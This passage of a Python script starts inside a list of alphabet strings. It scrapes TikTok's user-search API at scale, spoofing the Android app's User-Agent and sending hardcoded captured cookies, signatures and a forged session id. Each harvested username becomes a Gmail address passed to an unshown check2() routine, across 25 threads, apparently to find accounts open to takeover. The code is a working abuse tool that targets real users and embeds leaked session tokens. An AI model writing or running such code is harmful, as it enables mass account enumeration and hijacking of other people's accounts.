                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',  
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',  
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
                
                'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',  
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',  
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
'mmsnsbbshwfxwcwuwooqpqksnvacagahvsxaxvagsuqgfqxetywhev83563820283682262739282--$7827-$%#%#@@*$+972*2()/!;?/;;:-*$#728920+-2763%58 1234567890' 
               ]
            )        		      
    key = ''.join((random.choice(kill) for _ in range(random.randrange(3, 15))))
    rng = int("".join(random.choice("6789") for _ in range(1)))        
    name = "".join(random.choice("1234567890qwertyuiopasdfghjklzxcvbnm.") for _ in range(rng))
    usery = random.choice([name, key])      	
    he3 = {
        'User-Agent': "com.zhiliaoapp.musically/2022509040 (Linux; U; Android 12; ar; TECNO BF6; Build/SP1A.210812.001; Cronet/TTNetVersion:ae513f3c 2022-08-08 QuicVersion:12a1d5c5 2022-06-27)",
    }
    
    ttwid = requests.get('https://www.tiktok.com/', headers=he3).cookies.get_dict().get('ttwid', '')
    
    zaid = requests.get(
            'https://www.tiktok.com/api/search/user/full/',
            headers=he3,
            params={
                'aid': '1988',
                'keyword': 'zaid' ,
                'app_name': 'tiktok_web',
                'region': 'IQ',
                'msToken':'qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh'
            }
        )
    
    msToken = zaid.cookies.get_dict().get('msToken', '')
    params = {
        '_signature': '_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70',
        'X-Bogus': 'DFSzswVLRekANHWvtvtx-ShPmkfD'
    }
    
    ses = str(uuid4()).replace('-', '')
    cookies = {
            
            'cookie': f'''passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid=''' + ttwid + '; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken=' + msToken + '; msToken=' + msToken + '; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt' }
    url = f'''https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&keyword={usery}'''
    response = requests.get(url, params=params, headers=he3, cookies=cookies).json()   
    for users in response.get('user_list', []):
        user = users['user_info']['unique_id']
        if '_' in user:
                pass        
        if iko == '1':
          email = user + '@gmail.com'
          check2(email)
        elif iko == '5':
           fol = users['user_info']['follower_count']
           if int(fol) >= 10:
            email = user + '@gmail.com'
            check2(email)
        else:
        	print('  ')
        	exit()
  except:''
for _ in range (25):
	Thread(target=hasseh1).start()